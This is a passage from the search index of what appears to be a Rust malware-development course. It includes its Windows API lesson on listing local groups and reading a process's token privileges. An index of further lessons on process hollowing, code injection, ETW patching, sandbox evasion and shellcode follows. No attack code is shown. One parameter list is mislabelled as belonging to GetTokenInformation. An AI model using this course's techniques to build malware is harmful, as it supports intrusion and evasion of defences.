to use the offset method to move around the array.\nYou may also note that the NetApiBufferFree function is used to free the pointer to groups. This is necessary, as indicated in the documentation for the bufptr parameter of the NetUserGetLocalGroups function. This requirement marks the use of the C++ language in the API, as it is not present in Rust.\nTo complete this example, and as explained in the previous section, it is necessary to use features.\nThe features used in this program are:\n[dependencies.windows]\nfeatures = [\n&nbsp;&nbsp;&nbsp; \"Win32_Foundation\",\n&nbsp;&nbsp;&nbsp; \"Win32_System_WindowsProgramming\",\n&nbsp;&nbsp;&nbsp; \"Win32_NetworkManagement_NetManagement\",\n&nbsp;&nbsp;&nbsp; \"Win32_System_Diagnostics_Debug\"\n]\n\nYou can see a certain patern in feature names, for example in the use windows::Win32::NetworkManagement::NetManagement::UNLEN, which is part of the \"Win32_NetworkManagement_NetManagement\" feature.\nRecovering process privileges🔗\nThis second example shows how to recover process privileges.\nuse windows::Win32::Foundation::HANDLE;\nuse windows::Win32::System::Threading::GetCurrentProcess;\nuse windows::Win32::System::Threading::OpenProcessToken;\nuse windows::Win32::Security::GetTokenInformation;\nuse windows::Win32::Security::TokenPrivileges;\nuse windows::Win32::Security::TOKEN_PRIVILEGES;\nuse windows::Win32::Security::TOKEN_QUERY;\nuse windows::Win32::Security::LookupPrivilegeNameA;\nuse windows::core::PSTR;\nuse std::ffi::CStr;\nuse std::ptr;\n\nfn main() {\n&nbsp;&nbsp;&nbsp;

The order of the list below is important, as it shows how the program works and how the token is used to retrieve process privileges:\n\nGetCurrentProcess: This function returns a pseudo-handle to the process calling this function (we'll see what a handle is next). This value is the constant -1 converted into a Handle (we advise you not to raw this value for compatibility reasons). As you can see, this value is not the PID of the current process.\nOpenProcessToken: This function retrieves a token from a process via its Handle.\nGetTokenInformation: This function retrieves specific information about a token. In our case, we'll retrieve the privileges associated with the token.\nLookupPrivilegeNameA: This function allows us to convert a privilege in numeric format into a human-readable character string.\n\nThe GetCurrentProcess function has no parameters; it simply returns a pseudo-handle to the calling process.\nThe parameters for the OpenProcessToken function are:\n\nProcessHandle: The handle to the process from which we wish to retrieve a token.\nDesiredAccess: A bitmask indicating which tokens we wish to retrieve, here we indicate only TokenPrivileges.\nTokenHandle: Is a pointer to a handle where the handle to the token will be written (handles are used to point to tokens).\n\nThe parameters for the GetTokenInformation function are:\n\nTokenHandle: This is a handle to the token whose information you wish to retrieve, in this case the token retrieved with the OpenProcessToken function.\nTokenInformationClass: This is a value of the TOKEN_INFORMATION_CLASS enumeration, specifying the type of information you wish to retrieve. Several values are therefore possible, but in our case we use the TokenPrivileges value.\nTokenInformation: A pointer to a buffer that will receive the requested information. It's important to note that the structure and size of this buffer depend on the type of information specified by TokenInformationClass.\nTokenInformationLength: The size, in bytes, of the buffer pointed to by TokenInformation.\nReturnLength: A pointer to a 32-bit unsigned integer (u32) that receives the actual size of the token information. Even if the buffer indicated in the TokenInformation parameter is too small, this value will be filled with the size needed to store the information. We use this feature to dynamically obtain the right size for our buffer. Note that if the buffer is not large enough, the function will return an error.\n\nThe parameters for the GetTokenInformation function are:\n\nlpSystemName: A pointer to a string specifying the name of the system in which to search for the privilege. None can be specified for the local system.\nlpLuid: A pointer to a LUID (Locally Unique Identifier) structure that identifies the privilege whose name you wish to obtain.\nlpName: A pointer to a buffer that will receive the privilege name as a character string. This buffer must be large enough to hold the name.\ncchName: A pointer to a 32-bit unsigned integer (u32) which specifies the size of the input buffer. After the call, this variable contains the number of characters written in the buffer to store the privilege name (hence the reference [in, out] to the left of this parameter name in the documentation).\n\nHandles🔗\nA handle is a reference to a resource in or on the system, such as files, processes, threads, graphical objects or sockets.\nThese handles are used by applications to access and manipulate these resources (as shown in this program).\nIt should be noted that each time a resource is opened or created, the operating system allocates a handle to this resource and returns this identifier to the application. A handle to a resource will therefore be different on every process in the system, and is not a unique identifier.\nCode explanation🔗\nThis program works as follows:\n\nA handle is retrieved from the current program.\nUse the previously retrieved handle to retrieve the token of privileges associated with the process.\nRetrieve the privileges associated with the retrieved token in the form of identifiers (each privilege is therefore an identifier).\nConvert privilege identifiers into human-readable character strings\n\nAs you can see, in this code we make 2 calls to the GetTokenInformation function, the first of which retrieves the size of the token structure in bytes, as this is required to create a buffer of sufficient size.\nTo enable human-readable privileges, we use the LookupPrivilegeNameA function, which converts the privilege number (LUID) into a character string.\nThe features required in this program are:\n[dependencies.windows]\nfeatures = [\n    \"Win32_Foundation\",\n    \"Win32_System\",\n    \"Win32_System_Threading\",\n    \"Win32_Security\",\n    \"Win32_System_Diagnostics_Debug\"\n]\n\nConclusion🔗\nThe windows-sys crate created by Microsoft makes it much easier to execute Windows API functions. This library provides links to Windows API functions and constants in Rust.\nHowever, a thorough understanding of the official Windows API documentation in C++ is essential to create Rust programs with the windows-sys crate. C++ documentation is necessary to understand the specific details of the functions, data types and structures used in the API. In parallel, it is necessary to consult the equivalents available in the windows-sys crate in the documentation to see any differences and simplifications made by Microsoft.\nIn short, although the windows-sys crate simplifies the process of calling Windows API functions in Rust, a solid reference to the C++ documentation remains indispensable for using the API correctly in Rust.\n","id":" https://nu11busters.github.io/rust-maldev-course/system/windows-api/","title":"Windows API"}},"docInfo":{" https://nu11busters.github.io/rust-maldev-course/about/":{"body":70,"title":0}," https://nu11busters.github.io/rust-maldev-course/cargo/":{"body":10,"title":1}," https://nu11busters.github.io/rust-maldev-course/cargo/cross-compilation/":{"body":510,"title":2}," https://nu11busters.github.io/rust-maldev-course/cargo/dynamic-library/":{"body":333,"title":2}," https://nu11busters.github.io/rust-maldev-course/cargo/optimise/":{"body":1140,"title":2}," https://nu11busters.github.io/rust-maldev-course/code_injection/":{"body":0,"title":2}," https://nu11busters.github.io/rust-maldev-course/code_injection/injection-with-ptrace/":{"body":466,"title":2}," https://nu11busters.github.io/rust-maldev-course/code_injection/process-hollowing/":{"body":602,"title":2}," https://nu11busters.github.io/rust-maldev-course/code_injection/remote-threads/":{"body":276,"title":1}," https://nu11busters.github.io/rust-maldev-course/conclusion/":{"body":259,"title":1}," https://nu11busters.github.io/rust-maldev-course/credits/":{"body":187,"title":2}," https://nu11busters.github.io/rust-maldev-course/crypto/":{"body":37,"title":1}," https://nu11busters.github.io/rust-maldev-course/crypto/aes/":{"body":383,"title":2}," https://nu11busters.github.io/rust-maldev-course/crypto/df/":{"body":278,"title":2}," https://nu11busters.github.io/rust-maldev-course/crypto/intro/":{"body":203,"title":1}," https://nu11busters.github.io/rust-maldev-course/crypto/rsa/":{"body":589,"title":2}," https://nu11busters.github.io/rust-maldev-course/crypto/sha256/":{"body":476,"title":1}," https://nu11busters.github.io/rust-maldev-course/crypto/sockets/":{"body":557,"title":2}," https://nu11busters.github.io/rust-maldev-course/evasion/":{"body":0,"title":1}," https://nu11busters.github.io/rust-maldev-course/evasion/anti-debug-with-isdebuggerpresent/":{"body":90,"title":1}," https://nu11busters.github.io/rust-maldev-course/evasion/anti-debug-with-ptrace/":{"body":211,"title":3}," https://nu11busters.github.io/rust-maldev-course/evasion/detect-sandbox/":{"body":1302,"title":2}," https://nu11busters.github.io/rust-maldev-course/evasion/direct-syscalls/":{"body":357,"title":2}," https://nu11busters.github.io/rust-maldev-course/evasion/fileless-execution/":{"body":330,"title":2}," https://nu11busters.github.io/rust-maldev-course/evasion/hells/":{"body":487,"title":2}," https://nu11busters.github.io/rust-maldev-course/evasion/hook-detection/":{"body":298,"title":2}," https://nu11busters.github.io/rust-maldev-course/evasion/patch-etw/":{"body":294,"title":2}," https://nu11busters.github.io/rust-maldev-course/evasion/query-wmi/":{"body":268,"title":2}," https://nu11busters.github.io/rust-maldev-course/home/":{"body":562,"title":3}," https://nu11busters.github.io/rust-maldev-course/obfuscation/":{"body":0,"title":1}," https://nu11busters.github.io/rust-maldev-course/obfuscation/auto-remove/":{"body":740,"title":2}," https://nu11busters.github.io/rust-maldev-course/obfuscation/dynamic-imports/":{"body":223,"title":2}," https://nu11busters.github.io/rust-maldev-course/obfuscation/metamorphism/":{"body":326,"title":1}," https://nu11busters.github.io/rust-maldev-course/obfuscation/polymorphism/":{"body":398,"title":1}," https://nu11busters.github.io/rust-maldev-course/obfuscation/strings/":{"body":191,"title":2}," https://nu11busters.github.io/rust-maldev-course/shellcode/":{"body":0,"title":1}," https://nu11busters.github.io/rust-maldev-course/shellcode/call-assembly-in-rust/":{"body":725,"title":3}," https://nu11busters.github.io/rust-maldev-course/shellcode/exec-shellcode-in-local/":{"body":779,"title":4}," https://nu11busters.github.io/rust-maldev-course/shellcode/generate-shellcode-for-linux/":{"body":221,"title":3}," https://nu11busters.github.io/rust-maldev-course/shellcode/generate-shellcode-for-windows/":{"body":1031,"title":3}," https://nu11busters.github.io/rust-maldev-course/system/":{"body":0,"title":2}," https://nu11busters.github.io/rust-maldev-course/system/libc-api/":{"body":737,"title":2}," https://nu11busters.github.io/rust-maldev-course/system/windows-api/":{"body":1502,"title":2}},"length":43},"lang":"English"};
